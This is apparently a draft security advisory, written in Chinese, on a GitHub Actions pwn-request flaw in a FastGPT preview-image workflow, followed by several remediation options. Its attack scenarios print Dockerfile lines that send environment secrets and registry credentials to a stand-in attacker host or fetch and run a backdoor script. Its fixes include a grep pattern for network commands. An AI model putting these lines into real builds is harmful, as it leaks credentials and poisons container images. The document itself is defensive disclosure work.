# GitHub Actions 安全漏洞分析 - GHSA-xfx8-w35j-485c

## 漏洞概述

**漏洞ID**: GHSA-xfx8-w35j-485c
**严重程度**: Critical (严重)
**漏洞类型**: 任意代码执行 / 供应链攻击
**受影响文件**: `.github/workflows/fastgpt-preview-image.yml`
**CWE分类**: CWE-494 (未经完整性检查的代码下载)
**报告时间**: 2026-03-15
**当前状态**: Draft (草稿状态)

## 漏洞详情

### 核心问题

该工作流使用 `pull_request_target` 触发器，这会授予工作流访问仓库密钥的权限，但同时检出了来自 PR 作者 fork 的代码。这导致攻击者可以：

1. **窃取密钥** - 通过修改 Dockerfile 来泄露环境中的密钥
2. **执行任意代码** - 在具有密钥访问权限的环境中运行恶意代码
3. **供应链攻击** - 将恶意镜像推送到生产容器镜像仓库

### 漏洞代码分析

```yaml
on:
  pull_request_target:    # ❌ 危险：授予密钥访问权限
  workflow_dispatch:

steps:
  - name: Checkout
    uses: actions/checkout@v3
    with:
      ref: ${{ github.event.pull_request.head.ref }}          # ❌ 检出攻击者的分支
      repository: ${{ github.event.pull_request.head.repo.full_name }}  # ❌ 检出攻击者的 fork

  - name: Login to Aliyun Container Registry
    uses: docker/login-action@v3
    with:
      registry: registry.cn-hangzhou.aliyuncs.com
      username: ${{ secrets.FASTGPT_ALI_IMAGE_USER }}    # ❌ 暴露密钥
      password: ${{ secrets.FASTGPT_ALI_IMAGE_PSW }}     # ❌ 暴露密钥

  - name: Build image
    run: |
      docker buildx build \
      -f ${{ steps.config.outputs.DOCKERFILE }} \    # ❌ 使用攻击者控制的 Dockerfile
      --push \                                        # ❌ 推送到生产镜像仓库
      -t ${{ steps.config.outputs.DOCKER_REPO_TAGGED }} \
      .
```

### 攻击场景

#### 场景 1: 密钥窃取

攻击者修改 `projects/app/Dockerfile`:

```dockerfile
# 攻击者添加的恶意代码
RUN env | base64 | curl -d @- https://attacker.example.com/exfil
```

或者更简单地：

```dockerfile
RUN curl -X POST -d "user=$FASTGPT_ALI_IMAGE_USER&pass=$FASTGPT_ALI_IMAGE_PSW" https://attacker.example.com/steal
```

#### 场景 2: 供应链攻击

攻击者在 Dockerfile 中植入后门：

```dockerfile
# 在正常构建步骤中插入
RUN curl -s https://attacker.example.com/backdoor.sh | sh
```

构建的恶意镜像会被推送到阿里云容器镜像仓库，标签为 `fastgpt-pr:fastgpt_<sha>`。任何拉取并运行此预览镜像的人都会执行攻击者的代码。

#### 场景 3: 镜像仓库接管

通过窃取的 `FASTGPT_ALI_IMAGE_USER` 和 `FASTGPT_ALI_IMAGE_PSW`，攻击者可以：

- 推送恶意镜像到**任何标签**（不仅限于 PR 预览）
- 覆盖生产镜像（`fastgpt:latest`、发布标签等）
- 危害所有从该镜像仓库拉取镜像的下游部署

### 暴露的密钥

| 密钥 | 风险 |
|------|------|
| `FASTGPT_ALI_IMAGE_USER` | 阿里云容器镜像仓库用户名 |
| `FASTGPT_ALI_IMAGE_PSW` | 阿里云容器镜像仓库密码 |
| `FASTGPT_ALI_IMAGE_PREFIX` | 镜像仓库路径（信息泄露） |
| `GITHUB_TOKEN` | 对 packages、pull requests、id-token、attestations 的写入权限 |

## 修复方案

### 方案 A: 使用 `pull_request` + `workflow_run` (推荐)

将工作流拆分为两个：

**工作流 1** (无特权，使用 `pull_request`):
```yaml
name: Build Preview Image
on:
  pull_request:
    branches: [main, 4.1, 5.0]

jobs:
  build:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v3
        # 默认检出 PR 的代码，但没有密钥访问权限

      - name: Build Docker image
        run: |
          docker buildx build \
          -f projects/app/Dockerfile \
          -t preview-image:${{ github.sha }} \
          --output type=docker,dest=/tmp/image.tar \
          .

      - name: Upload image artifact
        uses: actions/upload-artifact@v3
        with:
          name: preview-image
          path: /tmp/image.tar
```

**工作流 2** (有特权，使用 `workflow_run`):
```yaml
name: Push Preview Image
on:
  workflow_run:
    workflows: ["Build Preview Image"]
    types: [completed]

jobs:
  push:
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    runs-on: ubuntu-24.04
    steps:
      - name: Download image artifact
        uses: actions/download-artifact@v3
        with:
          name: preview-image

      - name: Load image
        run: docker load -i image.tar

      - name: Scan image (可选但推荐)
        run: |
          # 使用 trivy 或其他工具扫描镜像
          docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
            aquasec/trivy image preview-image:${{ github.sha }}

      - name: Login to Aliyun
        uses: docker/login-action@v3
        with:
          registry: registry.cn-hangzhou.aliyuncs.com
          username: ${{ secrets.FASTGPT_ALI_IMAGE_USER }}
          password: ${{ secrets.FASTGPT_ALI_IMAGE_PSW }}

      - name: Push image
        run: |
          docker tag preview-image:${{ github.sha }} \
            ${{ secrets.FASTGPT_ALI_IMAGE_PREFIX }}/fastgpt-pr:fastgpt_${{ github.sha }}
          docker push ${{ secrets.FASTGPT_ALI_IMAGE_PREFIX }}/fastgpt-pr:fastgpt_${{ github.sha }}
```

### 方案 B: 不检出 fork 代码

移除 `ref` 和 `repository` 覆盖，只使用基础分支代码：

```yaml
- name: Checkout
  uses: actions/checkout@v3
  # 不指定 ref 或 repository - 默认使用基础分支（安全）
```

**注意**: 这会改变工作流的行为（构建基础分支代码而非 PR 代码），但消除了代码执行风险。

### 方案 C: 需要维护者批准

添加 `environment` 配置，要求维护者在工作流运行前批准：

```yaml
jobs:
  preview-fastgpt-images:
    environment: preview-builds  # 需要维护者批准
    runs-on: ubuntu-24.04
```

然后在 GitHub 仓库设置中配置 `preview-builds` 环境，添加必需的审核者。

### 方案 D: 添加安全检查和限制

如果必须保持当前行为，至少添加以下安全措施：

```yaml
on:
  pull_request_target:
    branches: [main, 4.1, 5.0]
    types: [labeled]  # 只在添加标签时触发

jobs:
  preview-fastgpt-images:
    # 只有当 PR 有 'safe-to-build' 标签时才运行
    if: contains(github.event.pull_request.labels.*.name, 'safe-to-build')

    environment: preview-builds  # 需要批准

    steps:
      - name: Checkout
        uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.ref }}
          repository: ${{ github.event.pull_request.head.repo.full_name }}

      # 添加 Dockerfile 安全扫描
      - name: Scan Dockerfile
        run: |
          # 检查 Dockerfile 中的可疑命令
          for dockerfile in projects/*/Dockerfile; do
            if grep -E "(curl|wget|nc|bash|sh).*http" "$dockerfile"; then
              echo "⚠️ 警告: Dockerfile 包含网络命令"
              exit 1
            fi
          done

      - name: Login to Aliyun
        # ... 登录步骤

      - name: Build image (不推送)
        run: |
          docker buildx build \
          -f ${{ steps.config.outputs.DOCKERFILE }} \
          -t preview-image:test \
          .

      # 扫描构建的镜像
      - name: Scan built image
        run: |
          docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
            aquasec/trivy image --severity HIGH,CRITICAL preview-image:test

      # 只有扫描通过才推送
      - name: Push image
        if: success()
        run: |
          docker tag preview-image:test ${{ steps.config.outputs.DOCKER_REPO_TAGGED }}
          docker push ${{ steps.config.outputs.DOCKER_REPO_TAGGED }}
```

## 立即行动项

### 1. 轮换所有暴露的密钥 (紧急)

即使没有发生已知的利用，这些凭证已经暴露给任何 PR 作者的 Dockerfile 构建。需要立即轮换：

- `FASTGPT_ALI_IMAGE_USER`
- `FASTGPT_ALI_IMAGE_PSW`
- 任何相关的 PAT 令牌

### 2. 审计阿里云镜像仓库

检查是否有任何意外的镜像推送或标签覆盖：

```bash
# 列出所有 fastgpt-pr 镜像
aliyun cr ListRepoTag --RepoNamespace <namespace> --RepoName fastgpt-pr

# 检查可疑的推送时间和来源
```

### 3. 限制镜像仓库凭证权限

使用专用服务账号，权限仅限于 `fastgpt-pr` 仓库，而非整个镜像仓库命名空间。

### 4. 实施修复方案

建议采用**方案 A**（`pull_request` + `workflow_run`），因为它：
- 完全隔离了无特权构建和有特权推送
- 允许在推送前进行镜像扫描
- 保持了预览镜像的功能
- 符合 GitHub 安全最佳实践

## 当前状态评估

✅ **已确认**: 当前代码库中存在此漏洞
❌ **未修复**: 工作流仍然使用不安全的配置
🔴 **风险等级**: Critical - 需要立即修复

## 参考资料

- [GitHub Security Lab: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [GitHub Blog: Keeping your GitHub Actions secure](https://github.blog/security/vulnerability-research/keeping-your-github-actions-and-workflows-secure-preventing-pwn-requests/)
- [CWE-494: Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html)

## 建议的修复时间线

- **Day 0 (立即)**: 轮换所有密钥
- **Day 1**: 审计镜像仓库，检查可疑活动
- **Day 2-3**: 实施方案 A 或方案 C
- **Day 4**: 测试新工作流
- **Day 5**: 部署修复并关闭安全公告
